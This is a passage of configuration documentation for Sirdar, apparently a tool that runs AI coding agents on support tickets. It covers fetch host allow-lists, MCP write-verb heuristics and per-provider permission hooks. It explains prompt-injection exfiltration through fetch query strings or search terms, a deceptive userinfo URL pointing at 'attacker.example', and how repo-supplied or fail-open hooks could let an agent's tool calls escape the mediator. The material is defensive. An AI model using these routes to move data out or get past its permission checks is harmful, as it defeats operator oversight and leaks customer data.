### What the allow-list does not confine

`make *`, `go test*`, `npm test*` and `dotnet test*` run the workspace's own build system, and
a build system runs whatever the repository tells it to: a Makefile target, a `go:generate`
directive, an npm `pretest` script, an MSBuild task. Sirdar does not read any of that, and no
allow-list can — approving `make test` is approving the Makefile on the branch the session is
standing on.

That is deliberate, and it is the accepted residual of fix mode. A fix has to build and test
what it changed or its report is worthless, and the trust it asks for is the trust you already
extend when you check out a branch and type `make test` in your own shell. Sirdar narrows what
an ordinary mistake or an ordinary prompt injection reaches; it is not a sandbox around a build.
The review gate for what the session actually did is the pull request, which is the same gate
every other change in the repository goes through. If a workspace needs more than that, run
`sirdar fix` in a container.

## `fix.prIncludesComplaint`

The pull request `sirdar fix` opens describes the symptom, the root cause, the change and the
checks that were run. By default the symptom is the triage note's **title** — what broke —
rather than the complaint, which is the customer's own words out of a support ticket:

```yaml
fix:
  prIncludesComplaint: true
```

Turn it on for a private repository where the ticket text is already in front of the same
people. Leave it off anywhere the pull request is public, or read by anyone who has no business
with that customer's conversation. The triage note is always linked either way, through the
tracker and helpdesk URLs in the body.

## Web fetch

`permissions.fetch` is the list of hosts a run may retrieve a URL from. It applies to Claude
Code's `WebFetch`, the `web_fetch` in Sirdar's own agent loop and in a qwen session, and an ACP
agent's `fetch` permission request — one list, whichever agent is driving.

It is empty by default, and empty means nothing is fetchable. That is the whole point of the
setting. A triage session reads attacker-supplied text as a matter of routine: a ticket
comment, a page a playbook points at, a file in the repository. Before this list existed a
fetch was approved on the tool's name alone, so an instruction hidden in any of that text could
name a destination of its own and carry what the session had read there in a query string. The
destination is now judged on every call.

An entry is a host, not a URL:

| Entry | Matches |
|---|---|
| `docs.example.com` | that host exactly, on any port, over https |
| `*.example.com` | any subdomain of it, over https — **not** the bare `example.com` |
| `http://localhost:3000` | a service on this machine, on that port, over http or https |
| `http://127.0.0.1` | the loopback address on any port |

Everything else about a URL is refused before the host is even looked at:

- a scheme other than https, unless a loopback entry above covers the host;
- userinfo — `https://docs.example.com@attacker.example/` is a request to `attacker.example`
  that reads like one to the documentation host;
- an IP literal, which skips the name the allow-list approved, and any private, loopback,
  link-local (`169.254.169.254`, the cloud metadata service), carrier-NAT or multicast address
  whatever else says;
- a URL that does not parse, or that names no host.

Entries are checked when the config loads: a path, a query, userinfo, a bare `*`, a wildcard
anywhere but a leading `*.`, an `https://` prefix, or `http://` in front of anything that is
not loopback all fail the load with a message naming `permissions.fetch[N]`. Each refused
fetch names the host it turned down and the setting, so a run that needed a page tells you
which line to add. `sirdar doctor` prints the list, or says that it is empty.

Redirects do not widen it. Sirdar's own `web_fetch` already refuses a redirect off the host
that was asked for, and each hop is put through the allow-list as well.

### What `permissions.fetch` does not cover

- **`WebSearch` / `web_search`.** They carry a query, not a destination, so there is no host to
  judge and they stay allowed. The query text is a residual channel: an injected instruction
  can put something the session read into a search term, and the search provider sees it. If
  that matters for your tickets, the answer is to drop the tool, not to configure this list.
- **The host's own address.** A name in the list that resolves to an internal address is
  allowed by the list. Sirdar's own fetch has a dial guard that refuses the connection on the
  resolved IP, so a public name pointed at `10.0.0.5` gets nothing; a provider CLI doing its
  own fetching has whatever guard it has.
- **A user-level allow rule in Claude Code.** See below.
- **Codex's built-in web search.** See below.

## MCP access

Two settings, and they do different jobs. `mcp.workspaceOnly` decides which servers the
session can see at all; `permissions.mcp` decides which of their tools it may call.

The setting applies to `provider: claude` and `provider: codex`. Each CLI takes a different
route to the same place.

With `mcp.workspaceOnly: true` (the default) and a `.mcp.json` in the workspace root, Sirdar
starts the Claude session with `--strict-mcp-config --mcp-config <workspace>/.mcp.json`, so
the session loads those servers and no others.

Codex has no such flag. Its MCP servers come from `[mcp_servers.<name>]` tables in the
`config.toml` inside `CODEX_HOME`, and neither override mechanism can subtract one:
`codex app-server -c mcp_servers=...` and `thread/start`'s `config` object both merge into the
configured table rather than replacing it (verified against codex-cli 0.154.0; the responses
are in `docs/research/06-wire-formats.md`). So Sirdar generates a `CODEX_HOME` per session
instead:

- `config.toml` is the operator's own file with every `mcp_servers` declaration stripped out,
  followed by one `[mcp_servers.<name>]` table per stdio server in the workspace's
  `.mcp.json`. Model, reasoning effort, project trust and everything else they set carries
  over verbatim, so a workspace-only run differs in its MCP servers and nothing else.
- `${VAR}` and `$VAR` in a server's `args` and `env` are expanded as the file is written,
  from **the environment the session runs with** — which is Sirdar's minus every variable a
  configured source names as a credential. A `.mcp.json` naming one of those gets an empty
  string and a warning naming the variable (never its value), the same as `provider: openai`
  and `provider: claude`. That distinction is the difference between a helpdesk token staying
  in memory and a helpdesk token written to a file on disk.
- `auth.json` is **copied** in, so the session bills against the operator's login and a token
  refresh inside a triage run cannot damage the file their own `codex` sessions read. If
  Codex does refresh it mid-session, the new content is written back to the real file when
  the session ends — atomically, mode 0600 — but only when that file is still byte for byte
  what was copied. If their own `codex` moved it on meanwhile, the refresh is discarded
  rather than overwriting theirs, and the run's `stderrTail` says which of the two happened.
- every other entry of their real `CODEX_HOME` — `sessions`, `history.jsonl`, the state
  databases, `skills`, `plugins`, caches — is symlinked, so a thread started here is still on
  disk for the resume a schema retry needs.
- the directory is 0700 and the files in it 0600, and it is removed once the session's
  process has exited. Set `SIRDAR_KEEP_CODEX_HOME=1` to keep it and read the generated
  `config.toml`. A hard kill (SIGKILL, a power cut) leaves one behind; the next session
  sweeps `sirdar-codex-home-*` directories in `TMPDIR` that nothing has touched for 24 hours
  and whose lock file names no live process — a session that is still running keeps its home
  regardless of age.

**"Sirdar never modifies your `~/.codex`" means `config.toml` and `auth.json`.** Those two are
copied, and `config.toml` is never written back at all; `auth.json` only under the conditions
above. Everything else in that directory is *symlinked*, so a session writes through to the
real files: the thread goes into your `sessions/`, the prompt into `history.jsonl`, and Codex's
own state, log and queue databases are updated in place. That is deliberate — it is what makes
a workspace-only run differ from an ordinary one in its MCP servers and nothing else — but it
is a write, and worth knowing before pointing a run at a home you care about.

The MCP servers Codex starts get `PATH`, `HOME`, `LANG`, `LOGNAME`, `SHELL`, `TERM`, `TMPDIR`
and `USER`, plus whatever the server's own `env` declares — Codex's own filter, verified
against 0.154.0, and nothing of Sirdar's environment beyond it. `provider: openai` starts the
same servers with `PATH`, `HOME` and `LANG` plus their declared `env`. A server that needs one
of the other five therefore works under Codex and not under the openai loop; name it in the
server's `env` in `.mcp.json` and both will have it.

One server is in every Codex thread whatever the configuration says: `codex_apps`, the CLI's
own plugin runtime. It is part of Codex, like its shell tool, rather than something the
operator configured, and `permissions.mcp` judges its tools by name like any other.

With `mcp.workspaceOnly: true` and no such file, Sirdar passes
`--strict-mcp-config --mcp-config '{"mcpServers":{}}'` to Claude — strict against an empty
config — and generates a Codex home whose `config.toml` declares no servers, so
the session has **no MCP tools at all**. That is the safe reading of the setting, and it is a
change from earlier versions, which passed neither flag and let the session inherit every
user-level server the operator had (one dogfood run saw 102 tools from six of them, including
`deploy_to_vercel` and `buy_domain`, while `workspaceOnly` was true). A playbook that tells the
agent to query Grafana or a database will now get nothing back until those servers are written
into `<workspace>/.mcp.json`; `sirdar doctor`'s `mcp` row says which of the three states the
workspace is in.

With `mcp.workspaceOnly: false`, neither flag is passed and no Codex home is generated: the
session inherits the operator's own MCP servers, from `~/.claude.json` or `~/.codex/config.toml`
as the case may be. `permissions.mcp` still decides which of their tools it may call.

`provider: openai` is not affected by the setting, because it never had the wider reach to
give up: the loop starts MCP servers itself, and the workspace's `.mcp.json` is the only file
it reads.

`permissions.mcp` is a list of globs matched against an MCP tool's full name, e.g.
`mcp__grafana__query_*`. While the list is empty, an `mcp__*` tool is allowed unless a word
of its own name segment is a verb that describes a write — `create`, `update`, `edit`,
`delete`, `remove`, `write`, `save`, `log`, `send`, `post`, `put`, `patch`, `deploy`,
`pause`, `unpause`, `buy`, `purchase`, `add`, `set`, `upload`, `transition`, `assign`,
`close`, `archive`, `cancel`, `install`, `reset`, `revoke` — in which case it is denied with
`MCP tool <name> looks like a write and is not in permissions.mcp`. Every word is tested, not
just the first, so `mcp__athena__wiki_save` is denied on its second word.

A name that also carries a read word — `query`, `select`, `read`, `search`, `list`, `get`,
`find`, `describe`, `show` — is treated as a read whatever else it says. That is what keeps
`mcp__metabase__run_query` and `mcp__oxo-mysql-stg__run_select` usable; `run`, `exec`,
`start`, `stop`, `schedule` and `trigger` are not write verbs at all, because query tools are
routinely named that way.

The server part of the name is never what is tested, so
`mcp__plugin_vercel_vercel__buy_domain` is judged on `buy_domain`.

Once the list is non-empty it is the whole rule: a tool that matches no pattern is denied,
heuristic or not. That is the setting to use for a run you want to be read-only by
construction rather than by naming convention.

### How the permissions reach each provider

`permissions.bash`, `permissions.mcp` and `permissions.fetch` are one policy, applied at
whatever point the provider offers to be asked.

- **claude** — the CLI is started with `--permission-prompt-tool stdio`, so every tool call it
  is not already allowed to make arrives as a `can_use_tool` request and is answered from the
  policy. "Not already allowed" is the catch for fetches: a `WebFetch(domain:…)` rule in the
  operator's own `~/.claude/settings.json` is an allow rule the CLI applies itself, and a call
  it has allowed never reaches Sirdar. So while `permissions.fetch` is empty, `WebFetch` is
  named on `--disallowedTools`, and a deny rule beats an allow rule — no fetch happens,
  whatever the user settings say. Once the workspace names hosts, the flag comes off so the
  policy can judge each call, and a user-level `WebFetch(domain:…)` rule then bypasses Sirdar
  for that domain. There is no flag that switches those rules off; keep such a rule out of
  your user settings. `WebFetch`'s own `prompt` argument is scanned for URLs the same way a
  Qwen or gemini-style `web_fetch`'s is (see Web fetch above): a URL quoted anywhere in the
  prompt, even one the model only meant as instructions to itself and never intended to fetch,
  is judged against `permissions.fetch` and denies the whole call if it is not allowed. That
  fails closed rather than open — an unrelated URL sitting in the prompt text blocks a fetch it
  was never the destination of — which is the trade Sirdar makes on the side of not missing a
  URL a prompt injection did mean to route through.
- **openai** — the loop runs the tools itself, so it applies the policy before each call. Its
  `web_fetch` checks `permissions.fetch` a second time inside the tool, and again on every
  redirect hop.
- **qwen** — `web_fetch` goes through the same fail-closed `PreToolUse` hook as every other
  tool, under the name `WebFetch`, so `permissions.fetch` decides it. `web_search` is left
  registered and allowed (no destination to judge).
- **acp** — a permission request whose `kind` is `fetch` is judged as `WebFetch` against
  `permissions.fetch`, and the kind wins over the agent's own title, so an agent cannot route
  a fetch through the MCP rules by naming it `mcp__browser__get_page`. The URL is read out of
  the request's `rawInput` (`url`, `urls`, or a URL written into a `prompt`); a fetch request
  Sirdar cannot find a URL in is declined rather than approved unseen. ACP leaves it to the
  agent to decide what is worth asking about, so an agent that fetches without asking is not
  reached by the list at all — a completed `fetch` call that never raised a permission request
  is reported as an `EvError` on the run.
- **codex** — a triage session runs with `sandbox: read-only`, a fix session with
  `sandbox: workspace-write`, and both with `approvalPolicy: untrusted`, so Codex asks before
  running a shell command, calling an MCP tool or writing a file, and the policy answers.
  `commandExecution` approvals go to `permissions.bash` (`permissions.fixBash` in a fix),
  MCP tool-call approvals to `permissions.mcp`. A file change is refused outright in a triage
  run; in a fix run it is judged path by path, by the same rules a Claude fix's `Edit` calls
  go through — inside the workspace root, and not under `.git/`, `.sirdar/` or the hooks
  directory. The paths come from the `fileChange` item that precedes the approval (including
  any destination a rename writes to via the change's `kind.move_path`), since the approval
  itself carries only the item's id; an approval whose paths are unknown, and a
  request to hold a write permission open for a whole root rather than for this one patch,
  are both declined. A request to widen the sandbox is refused whatever the settings say.
  Every answer, allowed or refused, is an `EvPermission` line in the run's events with the
  reason the agent was given.

  This is new, and it changes two things about a Codex run. Shell commands used to run
  unjudged inside the sandbox — a narrow `permissions.bash` will now refuse some of what a
  Codex session used to do, and the run's events name each one. And MCP tools used not to work
  at all: under the previous `approvalPolicy: never` every call from the model came back
  `MCP tool call requires approval, but approval policy is never`, so a workspace could
  declare servers in `.mcp.json`, see them listed by `sirdar doctor`, and still get nothing
  from them. Both transcripts are in `docs/research/06-wire-formats.md`.

  One limit worth knowing: the policy only sees what Codex asks about. A tool Codex decides
  needs no approval runs without `permissions.mcp` being consulted.

  **`permissions.fetch` does not reach Codex.** Codex's web search and page fetching are its
  own built-in tools, run on its side and reported to the client as a finished `webSearch`
  item; there is no approval on the wire for them, so there is nothing for the policy to
  answer. What governs them is Codex's own configuration: the thread runs with
  `sandbox: read-only`, which is the app-server's whole network and filesystem setting for a
  triage thread — `thread/start` takes the sandbox mode and no separate network flag (see
  `docs/research/06-wire-formats.md`) — and whether the web tool exists at all is the
  `web_search` key in the operator's `config.toml`. The per-session `CODEX_HOME` Sirdar
  generates copies that file through with only its `mcp_servers` tables replaced, so a
  `web_search = true` an operator set globally still applies. A workspace that wants Codex not
  to fetch has to say so in its own `config.toml`.

  **`item/fileChange/requestApproval` firing under `workspace-write` + `untrusted` is
  schema-derived, not yet observed live.** The command-approval and MCP-elicitation paths
  above were each confirmed against a running `codex app-server` (see
  `docs/research/06-wire-formats.md`); the file-change path was built by reading the
  app-server's declared `ServerRequest` shape, on the same reasoning that put it there, and
  has not itself been watched fire on an actual turn. One dogfood fix turn that has the agent
  write through a hook — a live run, deliberately spending Codex quota — would confirm it.

## Attachment filtering

An attachment the helpdesk downloaded is kept only if the session could open it. Images,
PDFs, `text/*`, JSON, CSV, XML and ZIP are kept; audio, video and anything else is deleted
from the bundle, as is any file over `attachments.maxBytes`. Each dropped file is named, with
its size, in the run's warnings and in the prompt, so the agent reports it as evidence it
could not read instead of hunting for a transcoder.

## Languages

A support ticket and the note about it are rarely in the same language. Sirdar's workspace
reads Arabic tickets from Saudi customers, writes the engineer's note in English, and replies
to the customer in Arabic. The `language` block names both ends of that:

```yaml
language:
  notes: en
  customer: auto
  rtlMarkup: true
```

`notes` is the language of the note itself — the title, the timeline, the hypothesis, and the
translated complaint. There is no `auto` for it: the note is written for one team, and that
team reads one language.

`customer` is the language of the two fields a customer will see. `auto`, the default, means
the language of the ticket's first customer message, which is what a helpdesk serving one
country usually wants; a fixed code (`ar`, `en`, `ar-SA`) pins it regardless of what the
ticket is in. Both values go into the prompt verbatim, so the session is told which language
each field belongs in rather than inferring it.

Three schema fields carry the result:

| Field | Note | Content |
|---|---|---|
| `complaintOriginal` | Triage | The customer's complaint verbatim, untranslated, under `## Customer Complaint (original)` after the translated one |
| `customerReplyDraft` | Triage | `{language, text}`: a short status update the engineer could send, under `## Customer reply draft` |
| `rca.customerSummary` | RCA | `{language, text}`: what happened and what was done, for the support agent to relay, under `## Customer summary` |

All three are optional: a ticket already written in the note's language has no original to
keep, and a run that stops with a question has no reply to draft. The preamble forbids a
commitment in either customer-facing field — no fix, no cause, no date, nothing the ticket
does not already record as promised — because these are drafts a human sends, not replies
Sirdar sends, and nothing in Sirdar writes to a helpdesk.

`rtlMarkup` wraps a right-to-left paragraph the built-in templates emit in a
`<div dir="rtl">` block. Obsidian renders that HTML, so an Arabic complaint reads the way the
customer wrote it instead of being laid out left to right. It applies to the embedded
templates only: with `notes.templates` set, your templates own their markup and Sirdar adds
none. The desktop app drops the wrapper and uses `dir="auto"` instead, which resolves each
block on its own; an engineer who would rather read the whole note pane right to left can say
so under Settings, and that preference lives in their browser, not in this file.

## Templates override


Each note type (`triage`, `rca`, `resolution`) has a Go `text/template` file. Defaults are
embedded in the binary; setting `notes.templates` to a directory containing
`triage.md.tmpl`, `rca.md.tmpl`, and/or `resolution.md.tmpl` overrides one or more of them
(a missing file in that directory falls back to the embedded default for that kind).

`sirdar init --templates` writes the three embedded defaults into `.sirdar/templates`, ready to
edit; point `notes.templates` at that directory to use them.

Templates render against `{{.doc ...}}` (the validated note JSON), `{{.meta ...}}` (run
metadata: key, tracker/helpdesk URLs, customer, dates, run id, provider), and `{{.rtlMarkup}}`
(a bool, always false for an override — see Languages). Template functions:


| Function | Signature | Use |
|---|---|---|
| `join` | `join sep list` | Joins a JSON array of strings with `sep` |
| `fill` | `fill "NAME" value` | Renders `value`, or a visible `<fill: NAME>` marker when it's empty, for fields only a human can complete |
| `date` | `date value` | Passes a date string through unchanged; a named place to format dates from later |
| `default` | `default fallback value` | Renders `value`, or `fallback` when it's empty |
| `yq` | `yq value` | Renders `value` as a YAML double-quoted, escaped scalar; used on every frontmatter value so colons, quotes, and non-Latin text can't break the frontmatter block |
| `rtlWrap` | `rtlWrap .rtlMarkup value` | Wraps `value` in a `<div dir="rtl">` block when it contains right-to-left script and the markup is on, else renders it unchanged |


`sirdar doctor` and `sirdar init` both render every active template against a built-in sample
document and parse the resulting frontmatter as YAML, so a broken override is caught before a
real run rather than after.

## Providers

`provider: claude` (default), `provider: codex`, `provider: openai`, `provider: acp`, or
`provider: qwen` selects what drives runs; `--provider` on `triage` and `rca` overrides it per
invocation.

- `providers.claude.path`: path to the `claude` binary. Empty (the default) looks it up on
  `PATH`.
- `providers.codex.path`: path to the `codex` binary. Empty (the default) looks it up on
  `PATH`.
- `qwen.path`: path to the `qwen` binary. Empty (the default) looks it up on `PATH`. It sits in
  the `qwen:` block rather than under `providers:` because the rest of that block — the
  endpoint — belongs with it.
- `billing: subscription` (default) removes `ANTHROPIC_API_KEY` from the agent's child
  environment so the run authenticates with the CLI's own login and draws on your subscription.
  `billing: api` leaves the key in place, so the run is billed per token against that key
  instead.
- `billing: subscription` also removes `ANTHROPIC_BASE_URL`, `ANTHROPIC_AUTH_TOKEN`,
  `ANTHROPIC_CUSTOM_HEADERS`, `CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, and
  `CLAUDE_CODE_USE_FOUNDRY` from the agent's child environment, one `EvSystem` event per variable
  removed. None of them has a legitimate role in a subscription-billed run, and leaving
  `ANTHROPIC_BASE_URL` in place is what turns a stray shell export into a credential leak: with
  no gateway credential of its own, the CLI keeps your claude.ai OAuth login active and sends it
  to whatever host the base URL names. `sirdar doctor`'s `claude environment` row fails when any
  of these is set in your process environment while `billing: subscription` is in effect, and
  names which ones Sirdar is about to strip. `billing: api` passes all of them through unchanged
  — this is the supported way to point Sirdar at an Anthropic-compatible endpoint you control
  (Ollama, llama.cpp, a vendor gateway) — but the CLI's reported cost is fabricated behind a
  custom `ANTHROPIC_BASE_URL`, so `budget.maxUsd` cannot be trusted there; `doctor` reports the
  host (never the full URL) as a reminder. See
  `docs/research/providers/spike-anthropic-compatible.md` for the full investigation.

### `provider: qwen`

[Qwen Code](https://github.com/QwenLM/qwen-code) is a Gemini CLI fork whose headless mode is
modelled on Claude Code's, and despite the name it is not Qwen-only: it talks to any
OpenAI-compatible endpoint. It is the one third-party runtime that meets the whole of Sirdar's
contract natively — streaming events, schema-constrained output, resume, MCP, and a per-call
permission decision the host makes.

Install it with `npm i -g @qwen-code/qwen-code`. With no `qwen:` block the session runs against
whatever login the CLI already has:

```yaml
provider: qwen
```

Name an endpoint to point it somewhere else. The three fields go together — Qwen Code selects
its OpenAI-compatible backend only when a key, a base URL and a model are all present — so a
local server that checks no key still needs one named:

```yaml
provider: qwen
qwen:
  path: qwen                                # optional
  baseUrl: https://dashscope-intl.aliyuncs.com/compatible-mode/v1
  model: qwen3-coder-plus
  apiKey: keychain:dashscope-api-key
```

`qwen.apiKey` is resolved once, at startup, and held in memory. It reaches the child process as
`OPENAI_API_KEY` and nowhere else: it is never written to a run directory and never printed by
`sirdar doctor`. Everything Qwen Code reads to choose a backend, a credential, a settings
location or a system prompt — `OPENAI_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_MODEL`,
`QWEN_API_KEY`, `QWEN_BASE_URL`, `QWEN_MODEL`, `QWEN_CODE_MODEL`, `QWEN_OAUTH`,
`QWEN_DEFAULT_AUTH_TYPE`, `GEMINI_API_KEY`, `GEMINI_MODEL`, `QWEN_HOME`, `QWEN_DIR`,
`QWEN_CODE_SYSTEM_SETTINGS_PATH`, `QWEN_CODE_SYSTEM_DEFAULTS_PATH`,
`QWEN_CODE_TRUSTED_FOLDERS_PATH`, `QWEN_CODE_MCP_APPROVALS_PATH`, `QWEN_SYSTEM_MD`,
`QWEN_WRITE_SYSTEM_MD`, `QWEN_SYSTEM_IDENTITY_MD`, `QWEN_TLS_INSECURE`, `QWEN_CODE_SAFE_MODE` and
`QWEN_CODE_SIMPLE` (the last two force `disableAllHooks`, same as the settings-layer field below)
— is stripped from the environment the child inherits before the configured values go back in.
A session's endpoint
and settings are what the workspace configured, not what happens to be exported in the shell
that launched Sirdar. Two of those go back in pointing at files Sirdar wrote for the session
and deletes after it: `QWEN_CODE_SYSTEM_SETTINGS_PATH`, which carries the permission hook, and
`QWEN_CODE_TRUSTED_FOLDERS_PATH`, which carries the folder-trust verdict.

**Permissions.** Qwen Code emits no permission request on its stdout in headless mode. Instead
Sirdar starts a loopback HTTP listener for the session and registers it as a `PreToolUse` hook,
through a private settings file named by `QWEN_CODE_SYSTEM_SETTINGS_PATH`. Every tool call the
CLI is about to make is posted to that listener, judged by the same `permissions.bash` /
`permissions.mcp` rules every other provider uses, and answered with an allow or a deny whose
reason the model sees as the tool result.

`QWEN_CODE_SYSTEM_SETTINGS_PATH` replaces the **system** settings layer and nothing more:
your `~/.qwen/settings.json` and the repository's `.qwen/settings.json` are still loaded and
merged on top of it. It is where Sirdar registers its hook, not an isolation boundary. The
guarantees that have to hold whatever those layers say are on the command line, in the
folder-trust posture, and in two fields the system layer wins a merge conflict over: the
session's settings pin `disableAllHooks: false` and `security.allowedHttpHookUrls` to exactly
this session's hook URL, so a workspace or user layer that sets `disableAllHooks` (directly, or
through `QWEN_CODE_SAFE_MODE`/`QWEN_CODE_SIMPLE` above) or names some other allowed hook URL
cannot silence or redirect the mediator. Everything below was measured against 0.23.3 and is
written up in `docs/research/09-qwen-wire-formats.md`:

- **Only read tools are registered.** Every session passes `--exclude-tools` for every core
  tool of 0.23.3 except the ones a triage session reads with: `read_file`, `read_many_files`,
  `read_mcp_resource`, `grep_search`, `search_file_content`, `glob`, `list_directory`,
  `web_fetch`, `web_search`, `todo_write` and `structured_output` — plus the shell, which is
  conditional (next bullet). The excluded list is therefore `agent`, `artifact`,
  `ask_user_question`, `create_sub_session`, `cron_create`, `cron_delete`, `cron_list`,
  `display_image`, `edit`, `enter_plan_mode`, `enter_worktree`, `exit_plan_mode`,
  `exit_worktree`, `get_goal`, `image_gen`, `list_agents`, `loop_wakeup`, `lsp`, `monitor`,
  `notebook_edit`, `propose_goal`, `record_artifact`, `record_source`, `replace`,
  `report_findings`, `request_shutdown`, `save_memory`, `send_message`, `skill`, `task`,
  `task_create`, `task_list`, `task_stop`, `task_update`, `team_create`, `team_delete`,
  `team_plan_approval`, `tool_search`, `update_goal`, `workflow`, `write_file` and
  `zoom_image`. Qwen Code appends that flag to the merged deny list without consulting any
  settings layer, and a deny beats an allow, so those tools are never registered and the model
  is never offered them. Against the real binary, a workspace whose `.qwen/settings.json`
  allowed `run_shell_command`, `write_file`, `edit`, `monitor`, `agent` and `skill` was offered
  exactly `glob`, `grep_search`, `read_file`, `read_mcp_resource`, `structured_output` and
  `web_fetch`.
- **`agent`, `skill` and the task family are excluded for a second reason.** They are how a
  repository reaches the permission decision itself. A subagent declared in `.qwen/agents/*.md`
  and a project skill both carry a `hooks:` block; Qwen Code registers those under hook source
  `session`, which runs *after* every settings-layer hook, and its `PreToolUse` merge copies
  each hook's `hookSpecificOutput` over the last one — so the final `permissionDecision` wins
  and a repo-supplied hook that runs after Sirdar's turns a deny into an allow. Taking away the
  tools that register one closes that path. They are also no longer mapped onto Claude's `Task`
  in the policy, so if a later Qwen registers them anyway they are judged under their own names
  and refused.
- **The workspace runs untrusted.** The session's settings turn
  `security.folderTrust.enabled` on (it defaults to **false**, which means every folder is
  trusted) and `QWEN_CODE_TRUSTED_FOLDERS_PATH` points at a 0600 file of Sirdar's own naming
  the workspace `DO_NOT_TRUST`. The trust verdict is computed from the system and user layers
  merged with that file — never from the workspace layer — so a repository cannot vote itself
  trusted, and an entry the operator once added to `~/.qwen/trustedFolders.json` interactively
  does not carry into a Sirdar run. With the folder untrusted, Qwen Code substitutes an empty
  object for the whole workspace settings layer, and skips project agents, project skills'
  `allowedTools` and hooks, project `QWEN.md` context, LSP servers and auto-skill loading.
  Measured: the same workspace allow-list above put `run_shell_command` and `monitor` in front
  of the model when the folder was trusted, and neither when it was not.
- **MCP is the exception that keeps trust.** An untrusted folder makes Qwen Code skip MCP
  discovery outright, so a session configured to load MCP servers would quietly get none of
  them. A workspace that named servers — `mcp.workspaceOnly` with a `.mcp.json` present, or
  `mcp.workspaceOnly: false` — therefore runs trusted, and its `.qwen/settings.json` layer is
  live again; the exclusions above still hold, and a hook that layer registers runs *before*
  Sirdar's, so it cannot overwrite a decision. The default (`mcp.workspaceOnly` with no
  `.mcp.json`, which loads no servers) runs untrusted. A trusted workspace that actually carries
  its own `.qwen/settings.json` or `.qwen/agents/` gets a `system` event naming the path rather
  than a refusal — MCP is exactly the case that has to keep trust to work, so refusing here
  would take away the one thing trust was kept for.
- **A user-level `hooks` block, or `disableAllHooks`, refuses the session.** Qwen Code hands
  its Config the user scope's own hooks when `~/.qwen/settings.json` has any, and Sirdar's
  system-layer hook then falls through to the project slot, which an untrusted folder empties —
  the session would run with no mediator at all. Measured against the real binary: with such a
  file, no `PreToolUse` post arrived and the tool call ran unjudged. So Sirdar refuses to start a
  qwen session while that file registers hooks or sets `disableAllHooks: true` (belt and braces
  alongside the system-layer pin above), and says which file and why. The same check refuses
  outright, naming `HOME`, when neither `HOME` nor `USERPROFILE` is set in the session's
  environment: Node's own home lookup does not depend on either being set, so a session that had
  them stripped could still have the child read a real `~/.qwen/settings.json` this check never
  saw, and silently treating that as "no user hooks" would be the wrong direction to fail in.
- **The hook is authenticated, probed and watched.** Qwen Code fails open — a connection
  failure, a timeout and a non-2xx are all non-blocking hook failures, and the tool runs. So the
  hook URL carries a 32-byte random per-session token compared in constant time, and a request
  without it, without `POST`, without `application/json`, or carrying an `Origin` header (which
  the CLI's own server-side fetch never sends) is refused with no event recorded and no decision
  returned. The decision is written and flushed to the child before the permission event is
  published, so a slow event consumer cannot push a deny past the CLI's 15 s hook timeout and
  turn it into an allow. Starting a session probes the listener and fails if it cannot be
  reached; a listener that stops serving mid-run kills the process group and ends the run.
- **A tool that runs without a decision ends the session.** Every tool result is matched
  against the decisions the hook made. The first result for a call the hook never judged kills
  the process group, writes an `error` event reading `tool ran without a Sirdar decision;
  session aborted`, and fails the run — the CLI's own hook-failure path is fail-open, so a
  session that has lost its mediator would otherwise carry on with every later call running the
  same way.
- **What is left to the hook.** The read tools above are judged by the same `permissions.bash`
  / `permissions.mcp` rules every other provider uses; `read_mcp_resource` and every
  `mcp__server__tool` go through `permissions.mcp`. Any name the policy has not been taught —
  an MCP tool no pattern matches, or a tool a later Qwen adds and this list does not know — is
  refused with `Sirdar policy: not permitted`.
- **`web_fetch` is judged by `permissions.fetch`.** It reaches the hook under the name
  `WebFetch`, and the destination in its arguments — a `url`, or a URL written into a `prompt`
  — is matched against the workspace's host list before the call is allowed. With no list
  configured, no fetch is. `web_search` stays allowed: it names a query and no host (see Web
  fetch above for what that leaves open).

**The shell.** It is excluded the same way unless the workspace named `permissions.bash`
patterns. When it did, `--allowed-tools run_shell_command` puts it back and the hook is its
only gate — a Qwen rule written against `run_shell_command` allows every command whatever
specifier it carries, so per-command rules cannot be expressed at the CLI level at all.
`monitor` stays excluded either way: it takes a command string of its own and would be a
second, unjudged shell.

**Budgets.** `budget.maxTurns` becomes `--max-session-turns` (plus one, because the terminal
`structured_output` call spends a turn of its own) and, scaled by four, `--max-tool-calls`;
`budget.maxMinutes` becomes `--max-wall-time`. A session that named no turn budget still gets
`--max-tool-calls 200`. `budget.maxUsd` never triggers: the CLI reports no cost on the wire, so
cost is always `0` and the turn, tool-call and wall-clock budgets are what bound a run.

Qwen Code's `-s/--sandbox` is not passed. It wants a container image or a macOS Seatbelt profile
the operator has set up, a session that cannot start its sandbox fails outright, and it is
orthogonal to the guarantees above — so it is left to an operator who wants it to configure on
the binary rather than forced on every run.

**MCP.** Loading MCP servers costs the untrusted-folder posture described above, because Qwen
Code skips MCP discovery in an untrusted folder. `mcp.workspaceOnly` is expressed as
`--mcp-config <.mcp.json>` plus one
`--allowed-mcp-server-names` flag per server that file declares; a workspace with no `.mcp.json`
gets a sentinel name no server matches, which loads none. Qwen Code has no
`--strict-mcp-config`: `--mcp-config` merges with your own servers, and the allow-list by name
is the only thing that narrows the set. That narrowing is **by name only**. If one of your own
configured servers shares a name with a server the workspace's `.mcp.json` declares, it passes
the allow-list, and which of the two definitions the merge keeps is not something Sirdar
controls. Keep workspace server names distinctive, or keep the operator-level ones out of a
config a session can see.

**The schema retry costs a process.** Qwen Code refuses `--input-format stream-json` alongside
`--json-schema`, so a session takes exactly one message. When a note fails Sirdar's validation
the runner resumes the session id in a fresh process (`--resume`) and puts the correction there,
which is the path it already had for Codex.

`sirdar doctor` reports two rows:

```
[OK] qwen --version — 0.23.3
[OK] qwen endpoint — https://dashscope-intl.aliyuncs.com/compatible-mode/v1 (qwen3-coder-plus)
```

Not exercised against a live model: the wire capture was driven by a stub OpenAI-compatible
server, so the shapes are the CLI's own but no vendor model has run through this adapter yet.

### `provider: openai`

`claude` and `codex` spawn an agent CLI. `openai` does not: Sirdar runs the agent loop itself
against any OpenAI-compatible Chat Completions endpoint — an aggregator (OpenRouter, Groq,
Together, Fireworks), a vendor (DeepSeek, Zhipu, Moonshot, DashScope, xAI), or a server on your
own machine (Ollama, vLLM, LM Studio, llama.cpp).

```yaml
provider: openai
openai:
  baseUrl: https://openrouter.ai/api/v1     # or http://localhost:11434/v1
  apiKey: env:OPENROUTER_API_KEY            # omit for a local server that needs none
  model: qwen/qwen3-coder
  maxContextTokens: 128000
  price:
    inputPerMTok: 0.2
    outputPerMTok: 0.8
  temperature: 0
  extraHeaders:
    HTTP-Referer: https://github.com/srivathsanvenkateswaran/Sirdar
```

